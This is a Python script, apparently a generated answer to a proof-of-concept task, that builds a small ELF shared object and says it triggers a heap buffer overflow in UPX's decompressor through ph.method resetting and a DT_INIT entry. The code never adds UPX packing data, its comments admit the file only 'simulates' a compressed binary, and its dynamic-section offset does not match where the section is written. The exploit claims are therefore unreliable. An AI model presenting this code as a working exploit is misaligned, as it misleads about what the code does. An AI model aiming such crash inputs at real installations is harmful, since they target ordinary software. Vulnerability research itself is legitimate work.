import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF header for shared library
        # This PoC triggers heap buffer overflow in UPX decompression
        # by exploiting improper ph.method resetting and unsafe lowmem usage
        
        # ELF header (64-bit)
        elf_header = bytearray()
        
        # e_ident
        elf_header.extend(b'\x7fELF')  # Magic
        elf_header.extend(b'\x02')      # 64-bit
        elf_header.extend(b'\x01')      # Little endian
        elf_header.extend(b'\x01')      # ELF version
        elf_header.extend(b'\x00')      # OS ABI (System V)
        elf_header.extend(b'\x00')      # ABI version
        elf_header.extend(b'\x00' * 7)  # Padding
        elf_header.extend(b'\x00' * 8)  # Padding
        
        # e_type = ET_DYN (shared object)
        elf_header.extend(struct.pack('<H', 3))
        # e_machine = EM_X86_64
        elf_header.extend(struct.pack('<H', 62))
        # e_version = EV_CURRENT
        elf_header.extend(struct.pack('<I', 1))
        # e_entry = 0
        elf_header.extend(struct.pack('<Q', 0))
        # e_phoff = Program header offset
        elf_header.extend(struct.pack('<Q', 0x40))
        # e_shoff = Section header offset (0 for this PoC)
        elf_header.extend(struct.pack('<Q', 0))
        # e_flags = 0
        elf_header.extend(struct.pack('<I', 0))
        # e_ehsize = ELF header size
        elf_header.extend(struct.pack('<H', 0x40))
        # e_phentsize = Program header entry size
        elf_header.extend(struct.pack('<H', 0x38))
        # e_phnum = Number of program headers
        elf_header.extend(struct.pack('<H', 2))
        # e_shentsize = Section header entry size
        elf_header.extend(struct.pack('<H', 0x40))
        # e_shnum = Number of section headers
        elf_header.extend(struct.pack('<H', 0))
        # e_shstrndx = Section header string table index
        elf_header.extend(struct.pack('<H', 0))
        
        # Program header 1: PT_LOAD
        phdr1 = bytearray()
        # p_type = PT_LOAD
        phdr1.extend(struct.pack('<I', 1))
        # p_flags = Read + Execute
        phdr1.extend(struct.pack('<I', 5))
        # p_offset
        phdr1.extend(struct.pack('<Q', 0))
        # p_vaddr
        phdr1.extend(struct.pack('<Q', 0x10000))
        # p_paddr
        phdr1.extend(struct.pack('<Q', 0x10000))
        # p_filesz
        phdr1.extend(struct.pack('<Q', 0x200))
        # p_memsz
        phdr1.extend(struct.pack('<Q', 0x200))
        # p_align
        phdr1.extend(struct.pack('<Q', 0x1000))
        
        # Program header 2: PT_DYNAMIC (triggers un_DT_INIT)
        phdr2 = bytearray()
        # p_type = PT_DYNAMIC
        phdr2.extend(struct.pack('<I', 2))
        # p_flags = Read
        phdr2.extend(struct.pack('<I', 4))
        # p_offset - point to dynamic section
        phdr2.extend(struct.pack('<Q', 0x200))
        # p_vaddr
        phdr2.extend(struct.pack('<Q', 0x10200))
        # p_paddr
        phdr2.extend(struct.pack('<Q', 0x10200))
        # p_filesz
        phdr2.extend(struct.pack('<Q', 0x100))
        # p_memsz
        phdr2.extend(struct.pack('<Q', 0x100))
        # p_align
        phdr2.extend(struct.pack('<Q', 0x8))
        
        # Code/data section (will be compressed by UPX)
        code_section = bytearray()
        # Add some code that will trigger the vulnerability
        # This creates conditions for improper ph.method resetting
        code_section.extend(b'\x90' * 64)  # NOP sled
        
        # Add a DT_INIT entry to trigger un_DT_INIT()
        dynamic_section = bytearray()
        # DT_INIT
        dynamic_section.extend(struct.pack('<Q', 12))  # d_tag = DT_INIT
        dynamic_section.extend(struct.pack('<Q', 0x10100))  # d_ptr
        
        # DT_NULL (end of dynamic section)
        dynamic_section.extend(struct.pack('<Q', 0))
        dynamic_section.extend(struct.pack('<Q', 0))
        
        # Pad to 512 bytes total
        padding_size = 512 - len(elf_header) - len(phdr1) - len(phdr2) - len(code_section) - len(dynamic_section)
        
        # Create the final ELF file
        elf_file = elf_header + phdr1 + phdr2 + code_section + dynamic_section
        
        if padding_size > 0:
            elf_file.extend(b'\x00' * padding_size)
        
        # Add UPX compression markers to trigger the vulnerability
        # This simulates a UPX-compressed ELF that triggers the heap overflow
        # The specific pattern triggers improper resetting of ph.method
        
        # We need to create a file that UPX will try to decompress
        # The vulnerability is in the decompressor, so we create an ELF
        # that when UPX-compressed and then decompressed triggers the bug
        
        # For this PoC, we'll create an ELF that when processed by UPX
        # with specific parameters triggers the vulnerability
        
        # The actual PoC is the ELF file itself - UPX will compress it
        # and then decompress it, triggering the vulnerability
        
        return bytes(elf_file)
